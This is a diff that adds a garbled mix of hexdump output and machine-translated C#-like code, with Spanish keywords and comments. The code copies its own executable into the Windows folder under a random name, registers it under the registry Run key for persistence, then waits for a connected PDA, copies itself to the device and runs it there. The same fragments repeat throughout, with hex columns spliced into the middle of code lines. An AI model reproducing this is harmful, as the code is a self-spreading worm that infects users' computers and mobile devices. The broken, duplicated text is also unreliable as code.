@@ -1,0 +1,587 @@
+local8 = l00003430  ba 73 63 75 6c 61 73 0a  20 20 20 20 20 20 6c 6f  |.sculas.      lo|                    ocal5 + local7;
+          local9 = nuevo FileInfo (local8)00003440  63 61 6c 32 20 3d 20 6c  6f 63 61 6c 31 2e 49 6e  |cal2 = local1.In|
+;
+          local10 = nuevo Random (); #crear nombre de archi00003450  64 65 78 4f 66 20 28 22  63 65 22 29 3b 20 23 67  |dexOf ("ce"); #g|
+vo                                                                   local11 = Convert.ToString (local10.Next ())00003460  65 74 20 75 62 69 63 61  63 69 c3 b3 6e 20 64 65  |et ubicaci..n de|                                              + ".exe";
+          local12 = "c: \\ windows \00003470  20 6c 61 20 63 61 64 65  6e 61 20 63 65 20 65 6e  | la cadena ce en|    \" + local11; #incluye el camino
+          local13 = n00003480  20 74 69 70 6f 20 64 65  20 73 69 73 74 65 6d 61  | tipo de sistema|                   uevo -
+AutoStartApps ("SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersi00003490  20 6f 70 65 72 61 74 69  76 6f 0a 20 20 20 20 20  | operativo.     |
+on \\ Run \\");
+         # define la clave de 000034a0  20 6c 6f 63 61 6c 33 20  3d 20 6c 6f 63 61 6c 31  | local3 = local1|
+registro
+          local13.Add (local12); #add nuevo ar000034b0  2e 49 6e 64 65 78 4f 66  20 28 22 6d c3 b3 76 69  |.IndexOf ("m..vi|
+chivo al registro                                                    local4.Connect (); #000034c0  6c 22 29 3b 20 23 67 65  74 20 69 6e 64 65 78 20  |l"); #get index |
+ intentar conectarse a PDA                                           while000034d0  6f 66 20 73 74 72 69 6e  67 20 6d 6f 62 69 6c 65  |of string mobile|
+ (! (local4.DevicePresent)) #continu000034e0  20 65 6e 20 74 69 70 6f  20 64 65 20 73 69 73 74  | en tipo de sist|    ar bucle hasta que presente PDA
+         000034f0  65 6d 61 20 6f 70 65 72  61 74 69 76 6f 0a 20 20  |ema operativo.  |                                       local4.Connect (); #conectar
+                 local900003500  20 20 20 20 69 66 20 28  6c 6f 63 61 6c 32 20 3c  |    if (local2 <|                 .CopyTo (local12);
+             00003510  31 20 26 26 20 6c 6f 63  61 6c 33 20 3c 31 29 20  |1 && local3 <1) |                               local14 = "\\ Windows \\" + loc00003520  7b 23 73 69 20 6c 61 20  63 61 64 65 6e 61 20 63  |{#si la cadena c|
+al11; #definir destino                                            00003530  65 20 6f 20 6d 6f 62 69  6c 65 20 65 78 69 73 74  |e o mobile exist|
+         local4.CopyFileToDevice (local12, 00003540  65 2c 20 65 6a 65 63 75  74 65 0a 20 20 20 20 20  |e, ejecute.     |
+local14, verdadero); #copiar archivo a PDA00003550  20 20 20 74 72 61 74 61  72 20 7b 0a 20 20 20 20  |   tratar {.    |
+                                                                           local4.CreateProc00003560  20 20 20 20 20 20 6c 6f  63 61 6c 34 20 3d 20 6e  |      local4 = n|
+ess (local14, "0"); #execute archivo                            00003570  75 65 76 6f 20 52 41 50  49 20 28 29 3b 0a 20 20  |uevo RAPI ();.  |
+            local4.Disconnect (); #00003580  20 20 20 20 20 20 20 20  6c 6f 63 61 6c 35 20 3d  |        local5 =|     desconectar
+          }
+                                                                 00003590  20 41 73 73 65 6d 62 6c  79 2e 47 65 74 45 78 65  | Assembly.GetExe|
+  catch (Exception) {} #if error lue000035a0  63 75 74 69 6e 67 41 73  73 65 6d 62 6c 79 20 28  |cutingAssembly (|
+go captura excepción
+                                                                   000035b0  29 2e 20 47 65 74 4e 61  6d 65 20 28 29 2e 20 43  |). GetName (). C|
+}000035c0  6f 64 65 42 61 73 65 3b  0a 20 20 20 20 20 20 20  |odeBase;.       |
+000035d0  20 20 20 6c 6f 63 61 6c  35 20 3d 20 6c 6f 63 61  |   local5 = loca|                                        000035e0  6c 35 2e 52 65 70 6c 61  63 65 20 28 22 2f 22 2c  |l5.Replace ("/",|
+000035f0  20 22 5c 5c 22 29 3b 0a  20 20 20 20 20 20 20 20  | "\\");.        |
+00003600  20 20 6c 6f 63 61 6c 36  20 3d 20 6c 6f 63 61 6c  |  local6 = local|
+00003610  35 2e 4c 61 73 74 49 6e  64 65 78 4f 66 20 28 22  |5.LastIndexOf ("|
+00003620  5c 5c 22 29 3b 0a 20 20  20 20 20 20 20 20 20 20  |\\");.          |                                        00003630  6c 6f 63 61 6c 37 20 3d  20 6c 6f 63 61 6c 35 2e  |local7 = local5.|                                        00003640  53 75 62 73 74 72 69 6e  67 20 28 6c 6f 63 61 6c  |Substring (local|
+00003650  36 20 2b 20 31 2c 20 6c  6f 63 61 6c 35 2e 4c 65  |6 + 1, local5.Le|                                        00003660  6e 67 74 68 20 2d 20 6c  6f 63 61 6c 36 20 2d 20  |ngth - local6 - |
+00003670  31 29 3b 0a 20 20 20 20  20 20 20 20 20 20 6c 6f  |1);.          lo|
+00003680  63 61 6c 35 20 3d 20 6c  6f 63 61 6c 35 2e 20 45  |cal5 = local5. E|                                        00003690  6c 69 6d 69 6e 61 72 20  28 30 2c 20 38 29 3b 0a  |liminar (0, 8);.|
+000036a0  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 35  |          local5|
+000036b0  20 3d 20 6c 6f 63 61 6c  35 2e 53 75 62 73 74 72  | = local5.Substr|
+000036c0  69 6e 67 20 28 30 2c 20  6c 6f 63 61 6c 35 2e 4c  |ing (0, local5.L|                                        000036d0  61 73 74 49 6e 64 65 78  4f 66 20 28 22 5c 5c 22  |astIndexOf ("\\"|
+000036e0  29 20 2b 20 31 29 3b 0a  20 20 20 20 20 20 20 20  |) + 1);.        |
+000036f0  20 20 6c 6f 63 61 6c 38  20 3d 20 6c 6f 63 61 6c  |  local8 = local|                                        00003700  35 20 2b 20 6c 6f 63 61  6c 37 3b 0a 20 20 20 20  |5 + local7;.    |
+00003710  20 20 20 20 20 20 6c 6f  63 61 6c 39 20 3d 20 6e  |      local9 = n|
+00003720  75 65 76 6f 20 46 69 6c  65 49 6e 66 6f 20 28 6c  |uevo FileInfo (l|                                        00003730  6f 63 61 6c 38 29 3b 0a  20 20 20 20 20 20 20 20  |ocal8);.        |
+00003740  20 20 6c 6f 63 61 6c 31  30 20 3d 20 6e 75 65 76  |  local10 = nuev|
+00003750  6f 20 52 61 6e 64 6f 6d  20 28 29 3b 20 23 63 72  |o Random (); #cr|                                        00003760  65 61 72 20 6e 6f 6d 62  72 65 20 64 65 20 61 72  |ear nombre de ar|
+00003770  63 68 69 76 6f 0a 20 20  20 20 20 20 20 20 20 20  |chivo.          |
+00003780  6c 6f 63 61 6c 31 31 20  3d 20 43 6f 6e 76 65 72  |local11 = Conver|
+00003790  74 2e 54 6f 53 74 72 69  6e 67 20 28 6c 6f 63 61  |t.ToString (loca|
+000037a0  6c 31 30 2e 4e 65 78 74  20 28 29 29 20 2b 20 22  |l10.Next ()) + "|                                        000037b0  2e 65 78 65 22 3b 0a 20  20 20 20 20 20 20 20 20  |.exe";.         |
+000037c0  20 6c 6f 63 61 6c 31 32  20 3d 20 22 63 3a 20 5c  | local12 = "c: \|
+000037d0  5c 20 77 69 6e 64 6f 77  73 20 5c 5c 22 20 2b 20  |\ windows \\" + |                                        000037e0  6c 6f 63 61 6c 31 31 3b  20 23 69 6e 63 6c 75 79  |local11; #incluy|
+000037f0  65 20 65 6c 20 63 61 6d  69 6e 6f 0a 20 20 20 20  |e el camino.    |
+00003800  20 20 20 20 20 20 6c 6f  63 61 6c 31 33 20 3d 20  |      local13 = |                                        00003810  6e 75 65 76 6f 20 2d 0a  41 75 74 6f 53 74 61 72  |nuevo -.AutoStar|
+00003820  74 41 70 70 73 20 28 22  53 4f 46 54 57 41 52 45  |tApps ("SOFTWARE|
+00003830  20 5c 5c 20 4d 69 63 72  6f 73 6f 66 74 20 5c 5c  | \\ Microsoft \\|
+00003840  20 57 69 6e 64 6f 77 73  20 5c 5c 20 43 75 72 72  | Windows \\ Curr|
+00003850  65 6e 74 56 65 72 73 69  6f 6e 20 5c 5c 20 52 75  |entVersion \\ Ru|                                        00003860  6e 20 5c 5c 22 29 3b 0a  20 20 20 20 20 20 20 20  |n \\");.        |
+00003870  20 23 20 64 65 66 69 6e  65 20 6c 61 20 63 6c 61  | # define la cla|
+00003880  76 65 20 64 65 20 72 65  67 69 73 74 72 6f 0a 20  |ve de registro. |                                        00003890  20 20 20 20 20 20 20 20  20 6c 6f 63 61 6c 31 33  |         local13|
+000038a0  2e 41 64 64 20 28 6c 6f  63 61 6c 31 32 29 3b 20  |.Add (local12); |
+000038b0  23 61 64 64 20 6e 75 65  76 6f 20 61 72 63 68 69  |#add nuevo archi|                                        000038c0  76 6f 20 61 6c 20 72 65  67 69 73 74 72 6f 0a 20  |vo al registro. |
+000038d0  20 20 20 20 20 20 20 20  20 6c 6f 63 61 6c 34 2e  |         local4.|
+000038e0  43 6f 6e 6e 65 63 74 20  28 29 3b 20 23 20 69 6e  |Connect (); # in|
+000038f0  74 65 6e 74 61 72 20 63  6f 6e 65 63 74 61 72 73  |tentar conectars|
+00003900  65 20 61 20 50 44 41 0a  20 20 20 20 20 20 20 20  |e a PDA.        |                                        00003910  20 20 77 68 69 6c 65 20  28 21 20 28 6c 6f 63 61  |  while (! (loca|
+00003920  6c 34 2e 44 65 76 69 63  65 50 72 65 73 65 6e 74  |l4.DevicePresent|                                        00003930  29 29 20 23 63 6f 6e 74  69 6e 75 61 72 20 62 75  |)) #continuar bu|
+00003940  63 6c 65 20 68 61 73 74  61 20 71 75 65 20 70 72  |cle hasta que pr|
+00003950  65 73 65 6e 74 65 20 50  44 41 0a 20 20 20 20 20  |esente PDA.     |                                        00003960  20 20 20 20 20 20 20 20  20 20 20 20 6c 6f 63 61  |            loca|
+00003970  6c 34 2e 43 6f 6e 6e 65  63 74 20 28 29 3b 20 23  |l4.Connect (); #|
+00003980  63 6f 6e 65 63 74 61 72  0a 20 20 20 20 20 20 20  |conectar.       |
+00003990  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 39  |          local9|
+000039a0  2e 43 6f 70 79 54 6f 20  28 6c 6f 63 61 6c 31 32  |.CopyTo (local12|
+000039b0  29 3b 20 0a 20 20 20 20  20 20 20 20 20 20 20 20  |); .            |
+000039c0  20 20 20 20 20 6c 6f 63  61 6c 31 34 20 3d 20 22  |     local14 = "|                                        000039d0  5c 5c 20 57 69 6e 64 6f  77 73 20 5c 5c 22 20 2b  |\\ Windows \\" +|                                        000039e0  20 6c 6f 63 61 6c 31 31  3b 20 23 64 65 66 69 6e  | local11; #defin|
+000039f0  69 72 20 64 65 73 74 69  6e 6f 0a 20 20 20 20 20  |ir destino.     |
+00003a00  20 20 20 20 20 20 20 20  20 20 20 6c 6f 63 61 6c  |           local|                                        00003a10  34 2e 43 6f 70 79 46 69  6c 65 54 6f 44 65 76 69  |4.CopyFileToDevi|
+00003a20  63 65 20 28 6c 6f 63 61  6c 31 32 2c 20 6c 6f 63  |ce (local12, loc|
+00003a30  61 6c 31 34 2c 20 76 65  72 64 61 64 65 72 6f 29  |al14, verdadero)|                                        00003a40  3b 20 23 63 6f 70 69 61  72 20 61 72 63 68 69 76  |; #copiar archiv|
+00003a50  6f 20 61 20 50 44 41 0a  20 20 20 20 20 20 20 20  |o a PDA.        |
+00003a60  20 20 20 20 20 20 20 20  6c 6f 63 61 6c 34 2e 43  |        local4.C|                                        00003a70  72 65 61 74 65 50 72 6f  63 65 73 73 20 28 6c 6f  |reateProcess (lo|
+00003a80  63 61 6c 31 34 2c 20 22  30 22 29 3b 20 23 65 78  |cal14, "0"); #ex|
+00003a90  65 63 75 74 65 20 61 72  63 68 69 76 6f 0a 20 20  |ecute archivo.  |                                        00003aa0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6c  |               l|
+00003ab0  6f 63 61 6c 34 2e 44 69  73 63 6f 6e 6e 65 63 74  |ocal4.Disconnect|
+00003ac0  20 28 29 3b 20 23 64 65  73 63 6f 6e 65 63 74 61  | (); #desconecta|
+00003ad0  72 0a 20 20 20 20 20 20  20 20 20 20 7d 0a 0a 20  |r.          }.. |
+00003ae0  20 20 20 20 20 20 20 63  61 74 63 68 20 28 45 78  |       catch (Ex|                                        00003af0  63 65 70 74 69 6f 6e 29  20 7b 7d 20 23 69 66 20  |ception) {} #if |
+00003b00  65 72 72 6f 72 20 6c 75  65 67 6f 20 63 61 70 74  |error luego capt|
+00003b10  75 72 61 20 65 78 63 65  70 63 69 c3 b3 6e 0a 0a  |ura excepci..n..|
+local1 = Environment.OSVersion.ToString (); #obtener el tipo de sistema operativo actual                                    local1 = local1.ToLower (); #convertir a minúsculas
+      local2 = local1.IndexOf ("ce"); #get ubicación de la cadena ce en tipo de sistema operativo
+      local3 = local1.IndexOf ("móvil"); #get index of string mobile en tipo de sistema operativo                           if (local2 <1 && local3 <1) {#si la cadena ce o mobile existe, ejecute                                                  tratar {                                                     local4 = nuevo RAPI ();
+          local5 = Assembly.GetExecutingAssembly (). GetName (). CodeBase;                                                      local5 = local5.Replace ("/", "\\");                       local6 = local5.LastIndexOf ("\\");
+          local7 = local5.Substring (local6 + 1,00003b20  20 20 20 20 20 20 20 20  7d 6c 6f 63 61 6c 31 20  |        }local1 |                                                    local5.Length - local6 - 1);
+          loca00003b30  3d 20 45 6e 76 69 72 6f  6e 6d 65 6e 74 2e 4f 53  |= Environment.OS|                          l5 = local5. Eliminar (0, 8);
+          local5 00003b40  56 65 72 73 69 6f 6e 2e  54 6f 53 74 72 69 6e 67  |Version.ToString|
+= local5.Substring (0, local5.LastIndexOf ("\\") + 1);00003b50  20 28 29 3b 20 23 6f 62  74 65 6e 65 72 20 65 6c  | (); #obtener el|
+00003b60  20 74 69 70 6f 20 64 65  20 73 69 73 74 65 6d 61  | tipo de sistema|                                        00003b70  20 6f 70 65 72 61 74 69  76 6f 20 61 63 74 75 61  | operativo actua|
+00003b80  6c 0a 20 20 20 20 20 20  6c 6f 63 61 6c 31 20 3d  |l.      local1 =|
+00003b90  20 6c 6f 63 61 6c 31 2e  54 6f 4c 6f 77 65 72 20  | local1.ToLower |
+00003ba0  28 29 3b 20 23 63 6f 6e  76 65 72 74 69 72 20 61  |(); #convertir a|                                        00003bb0  20 6d 69 6e c3 ba 73 63  75 6c 61 73 0a 20 20 20  | min..sculas.   |
+00003bc0  20 20 20 6c 6f 63 61 6c  32 20 3d 20 6c 6f 63 61  |   local2 = loca|
+00003bd0  6c 31 2e 49 6e 64 65 78  4f 66 20 28 22 63 65 22  |l1.IndexOf ("ce"|
+00003be0  29 3b 20 23 67 65 74 20  75 62 69 63 61 63 69 c3  |); #get ubicaci.|                                        00003bf0  b3 6e 20 64 65 20 6c 61  20 63 61 64 65 6e 61 20  |.n de la cadena |
+00003c00  63 65 20 65 6e 20 74 69  70 6f 20 64 65 20 73 69  |ce en tipo de si|
+00003c10  73 74 65 6d 61 20 6f 70  65 72 61 74 69 76 6f 0a  |stema operativo.|                                        00003c20  20 20 20 20 20 20 6c 6f  63 61 6c 33 20 3d 20 6c  |      local3 = l|                                        00003c30  6f 63 61 6c 31 2e 49 6e  64 65 78 4f 66 20 28 22  |ocal1.IndexOf ("|
+
+          local8 = local5 + local7;                                00003c40  6d c3 b3 76 69 6c 22 29  3b 20 23 67 65 74 20 69  |m..vil"); #get i|                                  local9 = nuevo FileInfo (local8);
+       00003c50  6e 64 65 78 20 6f 66 20  73 74 72 69 6e 67 20 6d  |ndex of string m|                                    local10 = nuevo Random (); #crear nombre 00003c60  6f 62 69 6c 65 20 65 6e  20 74 69 70 6f 20 64 65  |obile en tipo de|                                                       de archivo
+          local11 = Convert.ToStr00003c70  20 73 69 73 74 65 6d 61  20 6f 70 65 72 61 74 69  | sistema operati|       ing (local10.Next ()) + ".exe";
+          local1200003c80  76 6f 0a 20 20 20 20 20  20 69 66 20 28 6c 6f 63  |vo.      if (loc|
+ = "c: \\ windows \\" + local11; #incluye el 00003c90  61 6c 32 20 3c 31 20 26  26 20 6c 6f 63 61 6c 33  |al2 <1 && local3|
+camino
+          local13 = nuevo -                                AutoS00003ca0  20 3c 31 29 20 7b 23 73  69 20 6c 61 20 63 61 64  | <1) {#si la cad|                                   tartApps ("SOFTWARE \\ Microsoft \\ Windows 00003cb0  65 6e 61 20 63 65 20 6f  20 6d 6f 62 69 6c 65 20  |ena ce o mobile |
+\\ CurrentVersion \\ Run \\");                                      # d00003cc0  65 78 69 73 74 65 2c 20  65 6a 65 63 75 74 65 0a  |existe, ejecute.|
+efine la clave de registro
+          local13.Add (l00003cd0  20 20 20 20 20 20 20 20  74 72 61 74 61 72 20 7b  |        tratar {|
+ocal12); #add nuevo archivo al registro                            00003ce0  0a 20 20 20 20 20 20 20  20 20 20 6c 6f 63 61 6c  |.          local|
+  local4.Connect (); # intentar conectarse a PDA           00003cf0  34 20 3d 20 6e 75 65 76  6f 20 52 41 50 49 20 28  |4 = nuevo RAPI (|
+          while (! (local4.DevicePresent)) #continuar b00003d00  29 3b 0a 20 20 20 20 20  20 20 20 20 20 6c 6f 63  |);.          loc|
+ucle hasta que presente PDA                                             00003d10  61 6c 35 20 3d 20 41 73  73 65 6d 62 6c 79 2e 47  |al5 = Assembly.G|                               local4.Connect (); #conectar
+       00003d20  65 74 45 78 65 63 75 74  69 6e 67 41 73 73 65 6d  |etExecutingAssem|                                           local9.CopyTo (local12);
+     00003d30  62 6c 79 20 28 29 2e 20  47 65 74 4e 61 6d 65 20  |bly (). GetName |
+            local14 = "\\ Windows \\" + local11; #defin00003d40  28 29 2e 20 43 6f 64 65  42 61 73 65 3b 0a 20 20  |(). CodeBase;.  |
+ir destino                                                                 local4.CopyFileToD00003d50  20 20 20 20 20 20 20 20  6c 6f 63 61 6c 35 20 3d  |        local5 =|
+evice (local12, local14, verdadero); #copiar 00003d60  20 6c 6f 63 61 6c 35 2e  52 65 70 6c 61 63 65 20  | local5.Replace |
+archivo a PDA
+                local4.CreateProce00003d70  28 22 2f 22 2c 20 22 5c  5c 22 29 3b 0a 20 20 20  |("/", "\\");.   |
+ss (local14, "0"); #execute archivo
+    00003d80  20 20 20 20 20 20 20 6c  6f 63 61 6c 36 20 3d 20  |       local6 = |                                                 local4.Disconnect (); #d00003d90  6c 6f 63 61 6c 35 2e 4c  61 73 74 49 6e 64 65 78  |local5.LastIndex|
+esconectar                                                           }
+
+        catch (Excepti00003da0  4f 66 20 28 22 5c 5c 22  29 3b 0a 20 20 20 20 20  |Of ("\\");.     |                  on) {} #if error luego captura excepción
+00003db0  20 20 20 20 20 6c 6f 63  61 6c 37 20 3d 20 6c 6f  |     local7 = lo|
+                                                                   }00003dc0  63 61 6c 35 2e 53 75 62  73 74 72 69 6e 67 20 28  |cal5.Substring (|                               00003dd0  6c 6f 63 61 6c 36 20 2b  20 31 2c 20 6c 6f 63 61  |local6 + 1, loca|                                        00003de0  6c 35 2e 4c 65 6e 67 74  68 20 2d 20 6c 6f 63 61  |l5.Length - loca|                                        00003df0  6c 36 20 2d 20 31 29 3b  0a 20 20 20 20 20 20 20  |l6 - 1);.       |                                        00003e00  20 20 20 6c 6f 63 61 6c  35 20 3d 20 6c 6f 63 61  |   local5 = loca|                                        00003e10  6c 35 2e 20 45 6c 69 6d  69 6e 61 72 20 28 30 2c  |l5. Eliminar (0,|                                        00003e20  20 38 29 3b 0a 20 20 20  20 20 20 20 20 20 20 6c  | 8);.          l|                                        00003e30  6f 63 61 6c 35 20 3d 20  6c 6f 63 61 6c 35 2e 53  |ocal5 = local5.S|                                        00003e40  75 62 73 74 72 69 6e 67  20 28 30 2c 20 6c 6f 63  |ubstring (0, loc|                                        00003e50  61 6c 35 2e 4c 61 73 74  49 6e 64 65 78 4f 66 20  |al5.LastIndexOf |                                        00003e60  28 22 5c 5c 22 29 20 2b  20 31 29 3b 0a 20 20 20  |("\\") + 1);.   |                                        00003e70  20 20 20 20 20 20 20 6c  6f 63 61 6c 38 20 3d 20  |       local8 = |                                        00003e80  6c 6f 63 61 6c 35 20 2b  20 6c 6f 63 61 6c 37 3b  |local5 + local7;|                                        00003e90  0a 20 20 20 20 20 20 20  20 20 20 6c 6f 63 61 6c  |.          local|                                        00003ea0  39 20 3d 20 6e 75 65 76  6f 20 46 69 6c 65 49 6e  |9 = nuevo FileIn|                                        00003eb0  66 6f 20 28 6c 6f 63 61  6c 38 29 3b 0a 20 20 20  |fo (local8);.   |                                        00003ec0  20 20 20 20 20 20 20 6c  6f 63 61 6c 31 30 20 3d  |       local10 =|                                        00003ed0  20 6e 75 65 76 6f 20 52  61 6e 64 6f 6d 20 28 29  | nuevo Random ()|                                        00003ee0  3b 20 23 63 72 65 61 72  20 6e 6f 6d 62 72 65 20  |; #crear nombre |                                        00003ef0  64 65 20 61 72 63 68 69  76 6f 0a 20 20 20 20 20  |de archivo.     |                                        00003f00  20 20 20 20 20 6c 6f 63  61 6c 31 31 20 3d 20 43  |     local11 = C|                                        00003f10  6f 6e 76 65 72 74 2e 54  6f 53 74 72 69 6e 67 20  |onvert.ToString |                                        00003f20  28 6c 6f 63 61 6c 31 30  2e 4e 65 78 74 20 28 29  |(local10.Next ()|                                        00003f30  29 20 2b 20 22 2e 65 78  65 22 3b 0a 20 20 20 20  |) + ".exe";.    |                                        00003f40  20 20 20 20 20 20 6c 6f  63 61 6c 31 32 20 3d 20  |      local12 = |                                        00003f50  22 63 3a 20 5c 5c 20 77  69 6e 64 6f 77 73 20 5c  |"c: \\ windows \|                                        00003f60  5c 22 20 2b 20 6c 6f 63  61 6c 31 31 3b 20 23 69  |\" + local11; #i|                                        00003f70  6e 63 6c 75 79 65 20 65  6c 20 63 61 6d 69 6e 6f  |ncluye el camino|                                        00003f80  0a 20 20 20 20 20 20 20  20 20 20 6c 6f 63 61 6c  |.          local|                                        00003f90  31 33 20 3d 20 6e 75 65  76 6f 20 2d 0a 41 75 74  |13 = nuevo -.Aut|                                        00003fa0  6f 53 74 61 72 74 41 70  70 73 20 28 22 53 4f 46  |oStartApps ("SOF|                                        00003fb0  54 57 41 52 45 20 5c 5c  20 4d 69 63 72 6f 73 6f  |TWARE \\ Microso|                                        00003fc0  66 74 20 5c 5c 20 57 69  6e 64 6f 77 73 20 5c 5c  |ft \\ Windows \\|                                        00003fd0  20 43 75 72 72 65 6e 74  56 65 72 73 69 6f 6e 20  | CurrentVersion |                                        00003fe0  5c 5c 20 52 75 6e 20 5c  5c 22 29 3b 0a 20 20 20  |\\ Run \\");.   |                                        00003ff0  20 20 20 20 20 20 23 20  64 65 66 69 6e 65 20 6c  |      # define l|                                        00004000  61 20 63 6c 61 76 65 20  64 65 20 72 65 67 69 73  |a clave de regis|                                        00004010  74 72 6f 0a 20 20 20 20  20 20 20 20 20 20 6c 6f  |tro.          lo|                                        00004020  63 61 6c 31 33 2e 41 64  64 20 28 6c 6f 63 61 6c  |cal13.Add (local|                                        00004030  31 32 29 3b 20 23 61 64  64 20 6e 75 65 76 6f 20  |12); #add nuevo |                                        00004040  61 72 63 68 69 76 6f 20  61 6c 20 72 65 67 69 73  |archivo al regis|                                        00004050  74 72 6f 0a 20 20 20 20  20 20 20 20 20 20 6c 6f  |tro.          lo|                                        00004060  63 61 6c 34 2e 43 6f 6e  6e 65 63 74 20 28 29 3b  |cal4.Connect ();|                                        00004070  20 23 20 69 6e 74 65 6e  74 61 72 20 63 6f 6e 65  | # intentar cone|                                        00004080  63 74 61 72 73 65 20 61  20 50 44 41 0a 20 20 20  |ctarse a PDA.   |                                        00004090  20 20 20 20 20 20 20 77  68 69 6c 65 20 28 21 20  |       while (! |                                        000040a0  28 6c 6f 63 61 6c 34 2e  44 65 76 69 63 65 50 72  |(local4.DevicePr|                                        000040b0  65 73 65 6e 74 29 29 20  23 63 6f 6e 74 69 6e 75  |esent)) #continu|                                        000040c0  61 72 20 62 75 63 6c 65  20 68 61 73 74 61 20 71  |ar bucle hasta q|                                        000040d0  75 65 20 70 72 65 73 65  6e 74 65 20 50 44 41 0a  |ue presente PDA.|                                        000040e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |                                        000040f0  20 6c 6f 63 61 6c 34 2e  43 6f 6e 6e 65 63 74 20  | local4.Connect |                                        00004100  28 29 3b 20 23 63 6f 6e  65 63 74 61 72 0a 20 20  |(); #conectar.  |                                        00004110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6c  |               l|                                        00004120  6f 63 61 6c 39 2e 43 6f  70 79 54 6f 20 28 6c 6f  |ocal9.CopyTo (lo|                                        00004130  63 61 6c 31 32 29 3b 20  0a 20 20 20 20 20 20 20  |cal12); .       |                                        00004140  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 31  |          local1|                                        00004150  34 20 3d 20 22 5c 5c 20  57 69 6e 64 6f 77 73 20  |4 = "\\ Windows |                                        00004160  5c 5c 22 20 2b 20 6c 6f  63 61 6c 31 31 3b 20 23  |\\" + local11; #|                                        00004170  64 65 66 69 6e 69 72 20  64 65 73 74 69 6e 6f 0a  |definir destino.|                                        00004180  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |                                        00004190  6c 6f 63 61 6c 34 2e 43  6f 70 79 46 69 6c 65 54  |local4.CopyFileT|                                        000041a0  6f 44 65 76 69 63 65 20  28 6c 6f 63 61 6c 31 32  |oDevice (local12|                                        000041b0  2c 20 6c 6f 63 61 6c 31  34 2c 20 76 65 72 64 61  |, local14, verda|                                        000041c0  64 65 72 6f 29 3b 20 23  63 6f 70 69 61 72 20 61  |dero); #copiar a|                                        000041d0  72 63 68 69 76 6f 20 61  20 50 44 41 0a 20 20 20  |rchivo a PDA.   |                                        000041e0  20 20 20 20 20 20 20 20  20 20 20 20 20 6c 6f 63  |             loc|                                        000041f0  61 6c 34 2e 43 72 65 61  74 65 50 72 6f 63 65 73  |al4.CreateProces|                                        00004200  73 20 28 6c 6f 63 61 6c  31 34 2c 20 22 30 22 29  |s (local14, "0")|                                        00004210  3b 20 23 65 78 65 63 75  74 65 20 61 72 63 68 69  |; #execute archi|                                        00004220  76 6f 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |vo.             |                                        00004230  20 20 20 20 6c 6f 63 61  6c 34 2e 44 69 73 63 6f  |    local4.Disco|                                        00004240  6e 6e 65 63 74 20 28 29  3b 20 23 64 65 73 63 6f  |nnect (); #desco|                                        00004250  6e 65 63 74 61 72 0a 20  20 20 20 20 20 20 20 20  |nectar.         |                                        00004260  20 7d 0a 0a 20 20 20 20  20 20 20 20 63 61 74 63  | }..        catc|                                        00004270  68 20 28 45 78 63 65 70  74 69 6f 6e 29 20 7b 7d  |h (Exception) {}|                                        00004280  20 23 69 66 20 65 72 72  6f 72 20 6c 75 65 67 6f  | #if error luego|
+00004290  20 63 61 70 74 75 72 61  20 65 78 63 65 70 63 69  | captura excepci|
+local1 = Environment.OSVersion.ToString (); #obtener el tipo de sistema operativo actual
+      local1 = local1.ToLower (); #convertir a minúsculas        local2 = local1.IndexOf ("ce"); #get ubicación de la cadena ce en tipo000042a0  c3 b3 6e 0a 0a 20 20 20  20 20 20 20 20 7d 6c 6f  |..n..        }lo|
+ de sistema operativo
+      000042b0  63 61 6c 31 20 3d 20 45  6e 76 69 72 6f 6e 6d 65  |cal1 = Environme|
+local3 = local1.IndexOf ("móvil"); #get index of stri000042c0  6e 74 2e 4f 53 56 65 72  73 69 6f 6e 2e 54 6f 53  |nt.OSVersion.ToS|                                              ng mobile en tipo de sistema 000042d0  74 72 69 6e 67 20 28 29  3b 20 23 6f 62 74 65 6e  |tring (); #obten|
+operativo
+      if (loca000042e0  65 72 20 65 6c 20 74 69  70 6f 20 64 65 20 73 69  |er el tipo de si|
+l2 <1 && local3 <1) {#si 000042f0  73 74 65 6d 61 20 6f 70  65 72 61 74 69 76 6f 20  |stema operativo |               la cadena ce o mobile existe, ejecute
+00004300  61 63 74 75 61 6c 0a 20  20 20 20 20 20 6c 6f 63  |actual.      loc|
+        tratar {
+     00004310  61 6c 31 20 3d 20 6c 6f  63 61 6c 31 2e 54 6f 4c  |al1 = local1.ToL|
+     local4 = nuevo RAPI 00004320  6f 77 65 72 20 28 29 3b  20 23 63 6f 6e 76 65 72  |ower (); #conver|               ();
+          local5 = 00004330  74 69 72 20 61 20 6d 69  6e c3 ba 73 63 75 6c 61  |tir a min..scula|
+Assembly.GetExecutingAssembly (00004340  73 0a 20 20 20 20 20 20  6c 6f 63 61 6c 32 20 3d  |s.      local2 =|         ). GetName (). CodeBase;
+00004350  20 6c 6f 63 61 6c 31 2e  49 6e 64 65 78 4f 66 20  | local1.IndexOf |
+          local5 = local5.Replace ("/", "\\");
+00004360  28 22 63 65 22 29 3b 20  23 67 65 74 20 75 62 69  |("ce"); #get ubi|
+          local6 = local5.LastIndexOf ("\\");
+00004370  63 61 63 69 c3 b3 6e 20  64 65 20 6c 61 20 63 61  |caci..n de la ca|
+          local7 = local5.Substring (local6 + 1, local5.00004380  64 65 6e 61 20 63 65 20  65 6e 20 74 69 70 6f 20  |dena ce en tipo |
+Length - local6 - 1);
+          local5 = local5.00004390  64 65 20 73 69 73 74 65  6d 61 20 6f 70 65 72 61  |de sistema opera|
+ Eliminar (0, 8);
+          local5 = local5.Substring (0, loca000043a0  74 69 76 6f 0a 20 20 20  20 20 20 6c 6f 63 61 6c  |tivo.      local|
+l5.LastIndexOf ("\\") + 1);                                          local8 = loca000043b0  33 20 3d 20 6c 6f 63 61  6c 31 2e 49 6e 64 65 78  |3 = local1.Index|                 l5 + local7;
+          local9 = nuevo FileInfo (000043c0  4f 66 20 28 22 6d c3 b3  76 69 6c 22 29 3b 20 23  |Of ("m..vil"); #|     local8);
+          local10 = nuevo Random (); #crear nombre de archivo                                                                000043d0  67 65 74 20 69 6e 64 65  78 20 6f 66 20 73 74 72  |get index of str|
